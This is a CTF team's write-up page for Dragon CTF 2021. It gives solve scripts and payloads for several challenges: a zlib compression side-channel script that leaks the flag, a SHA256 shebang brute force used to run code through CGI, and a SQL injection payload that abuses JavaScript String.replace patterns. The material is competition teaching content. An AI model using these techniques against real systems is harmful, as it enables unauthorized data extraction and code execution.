@@ -1,0 +1,358 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Dragon CTF 2021</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#crc-recursive-challenge">crc-recursive-challenge</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#compress-the-flag">compress-the-flag</a>
+    
+                <a class="dropdown-item" href="#ctf-gateway-interface">ctf-gateway-interface</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#webpwn">webpwn</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#shellcode_verifier">shellcode_verifier</a>
+    
+                <a class="dropdown-item" href="#dragonbox">dragonbox</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#crc-recursive-challenge" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">crc-recursive-challenge</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#compress-the-flag" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">compress-the-flag</span>
+            </a>
+    
+<a href="#ctf-gateway-interface" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ctf-gateway-interface</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#webpwn" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">webpwn</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#shellcode_verifier" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">shellcode_verifier</span>
+            </a>
+    
+<a href="#dragonbox" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">dragonbox</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="dragon-ctf-2021"><a class="header-link" href="#dragon-ctf-2021"></a>Dragon CTF 2021</h1>
+
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="crc-recursive-challenge"><a class="header-link" href="#crc-recursive-challenge"></a>CRC Recursive Challenge</h3>
+<p><a href="https://gist.github.com/sasdf/78fa4f4c9dc9db93534e4742b1de92e1">Code</a></p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="compress-the-flag"><a class="header-link" href="#compress-the-flag"></a>Compress The Flag</h3>
+<blockquote>
+<p>bookgin</p>
+</blockquote>
+<p>We got firstblood of this challenge!</p>
+<p>If the charater we guessed is correct, zlib compressed size will remain the same.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> string
+chars = string.ascii_uppercase + <span class="hljs-string">&#x27;grn{}&#x27;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_zlib</span>(<span class="hljs-params">res</span>):</span>
+    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> res.decode().splitlines():
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;zlib&#x27;</span> <span class="hljs-keyword">in</span> l:
+            <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(l.strip().rpartition(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>])
+    <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess_with_prefix</span>(<span class="hljs-params">flag</span>):</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">25</span>:
+        <span class="hljs-built_in">print</span>(flag)
+        <span class="hljs-keyword">import</span> random
+        random.seed(<span class="hljs-number">0</span>)
+        l = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>)]
+        random.shuffle(l)
+        <span class="hljs-built_in">print</span>(l)
+        new_l = [<span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>)]
+        <span class="hljs-keyword">for</span> src, dst <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(l):
+            new_l[dst] = flag[src]
+
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(new_l))
+        <span class="hljs-comment"># DrgnS{THISISACRIMEIGUESS}</span>
+        exit(<span class="hljs-number">0</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;guess prefix &#x27;</span> + <span class="hljs-built_in">repr</span>(flag))
+    gz2cs = {}
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chars:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;g&#x27;</span>, c)
+        guess = (flag + c) * <span class="hljs-number">30</span>
+        s.sendall((<span class="hljs-string">&#x27;0:&#x27;</span> + guess + <span class="hljs-string">&#x27;\n&#x27;</span>).encode())
+        gz = get_zlib(s.recv(<span class="hljs-number">4096</span>))
+        gz2cs[gz] = gz2cs.get(gz, <span class="hljs-string">&#x27;&#x27;</span>) + c
+    min_gz = <span class="hljs-built_in">min</span>(gz2cs.keys())
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(gz2cs[min_gz]) == <span class="hljs-built_in">len</span>(chars):
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;give up prefix &#x27;</span> + <span class="hljs-built_in">repr</span>(flag))
+        <span class="hljs-keyword">return</span>
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> gz2cs[min_gz]:
+        guess_with_prefix(flag + c)
+
+
+<span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> s:
+    <span class="hljs-comment">#s.connect((&#x27;127.0.0.1&#x27;, 1337))</span>
+    s.connect((<span class="hljs-string">&#x27;compresstheflag.hackable.software&#x27;</span>, <span class="hljs-number">1337</span>))
+    s.recv(<span class="hljs-number">1024</span>)
+    guess_with_prefix(<span class="hljs-string">&#x27;&#x27;</span>)</code></pre><h3 id="ctf-gateway-interface"><a class="header-link" href="#ctf-gateway-interface"></a>CTF Gateway Interface</h3>
+<blockquote>
+<p>written by bookgin, solved by ginoah</p>
+</blockquote>
+<p>In the session file, though we can run it through <code>/cgi-bin/session_&lt;HEX&gt;</code>, but the content is a SHA256 hash which cannot be easily controlled.</p>
+<p>Fortunately, in order to get the flag, we just need to run <code>./x</code>. Therefore, we can brute-force the hash to make the start of the hash become <em>shebang</em> <code>#!x\n</code>.</p>
+<p>Brute-force 4 bytes in SHA256 is doable.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> random
+SALT = <span class="hljs-string">b&quot;SaltyMcSaltFace&quot;</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    password = <span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">0x100000000000000</span>)).encode()
+    <span class="hljs-built_in">hash</span> = hashlib.sha256(SALT + password).digest()
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hash</span>.startswith(<span class="hljs-string">b&#x27;#!x\n&#x27;</span>):
+        <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>).write(<span class="hljs-built_in">repr</span>(password) + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-built_in">repr</span>(<span class="hljs-built_in">hash</span>[:<span class="hljs-number">4</span>]) + <span class="hljs-string">&#x27;\n&#x27;</span>)
+        
+<span class="hljs-comment"># 53594042019754885 - &gt; #!x\n</span></code></pre><p>Next, visit the following link to run <code>x</code> and retrieve the flag.</p>
+<pre class="hljs"><code>/cgi-bin/startAuth.cgi?password=53594042019754885
+/cgi-bin/session_bab090dafa836740e3b10e4f7ad167988afb06f2</code></pre><p>Flag: <code>DrgnS{valisMadeMeChangeTheFlagPfff}</code></p>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="webpwn"><a class="header-link" href="#webpwn"></a>Webpwn</h3>
+<blockquote>
+<p>written by bookgin, solved by Paul Huang, kaibro, ginoah</p>
+</blockquote>
+<p>javascript String.replace supports <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace">some interesting feature</a>. This bug/feature is even <a href="https://github.com/CTFd/CTFd/issues/1662">present in CTFd</a></p>
+<p>session is aac762ef0044d46ad245622acf5c6f35.
+Here is the payload:</p>
+<pre class="hljs"><code>{
+    <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;IS NULL),(<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>,<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$aac762ef0044d46ad245622acf5c6f35</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>,(select flag from flag))--&quot;</span>,
+    <span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>`&quot;
+}
+</span></code></pre><p>flag is in the note of e2
+<code>DrgnS{Everything_is_easy_wh3n_y0u_have_$$$_4b8c61}</code></p>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="shellcode_verifier"><a class="header-link" href="#shellcode_verifier"></a>Shellcode_verifier</h3>
+<p><a href="https://github.com/st424204/ctf_practice/tree/master/Dragon_CTF_2021/Shellcode_verifier">script</a></p>
+<h3 id="dragonbox"><a class="header-link" href="#dragonbox"></a>Dragonbox</h3>
+<p><a href="https://github.com/st424204/ctf_practice/tree/master/Dragon_CTF_2021/Dragonbox">script</a></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
